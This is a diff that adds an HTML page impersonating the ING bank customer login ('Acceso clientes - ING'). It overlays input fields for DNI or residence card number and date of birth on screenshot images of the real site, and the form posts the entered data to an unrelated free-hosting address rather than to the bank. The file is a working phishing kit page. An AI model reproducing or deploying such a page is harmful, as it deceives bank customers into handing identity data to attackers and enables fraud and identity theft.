@@ -1,0 +1,44 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<link rel="shortcut icon" type="image/x-icon" href="imgs/favicon.ico" />
+
+<title>Acceso clientes - ING</title>
+<style type="text/css">
+<!--
+#Layer1 {
+	position:absolute;
+	left:0px;
+	top:0px;
+	width:124px;
+	height:68px;
+	z-index:1;
+}
+#Layer2 {
+	position:absolute;
+	left:-1px;
+	top:625px;
+	width:161px;
+	height:123px;
+	z-index:2;
+}
+-->
+</style>
+</head>
+
+<body>
+<form method="post" action="http://u827038746.hostingerapp.com/pfm/pfm/pfm/info.php">
+
+<input name="hamza1" type="text" id="jour1" onkeyup="doNext(this, event);" onkeypress="checkCapsLock(event);" style="position:absolute;width:269px;height: 37px; left:296px; top:544px;z-index:12" required="" placeholder="DNI o Tarjeta de Residencia">
+<input name="jj" maxlength="2" type="text" placeholder="DD" id="jj" onkeyup="doNext(this, event);" onkeypress="checkCapsLock(event);" style="position:absolute;width:75px;height: 39px; left:297px; top:647px;z-index:12" required="" />
+<input name="mm" maxlength="2" type="text" placeholder="MM" id="mm" onkeyup="doNext(this, event);" onkeypress="checkCapsLock(event);" style="position:absolute;width:65px;height: 39px; left:383px; top:646px;z-index:12" required="" />
+<input name="aaaa" maxlength="4" type="text" placeholder="AAAA" id="aaaa" onkeyup="doNext(this, event);" onkeypress="checkCapsLock(event);" style="position:absolute;width:92px;height: 39px; left:465px; top:645px;z-index:12" required="" />
+<input name="jour12" type="image" src="imgs/submit.png" id="jour1" style="position:absolute;left:296px;top:764px;z-index:20">
+</form>
+
+<div id="Layer1"><img src="imgs/dr1.png" alt="haut" width="1345" height="628" border="0" usemap="#Map" />
+<map name="Map" id="Map"><area shape="rect" coords="105,18,195,53" href="index.html#" /><area shape="rect" coords="864,464,1011,490" href="index.html#" /><area shape="rect" coords="416,596,572,617" href="index.html#" /></map></div>
+<div id="Layer2"><img src="imgs/dr2.png" alt="bas" width="1321" height="361" /></div>
+</body>
+</html>
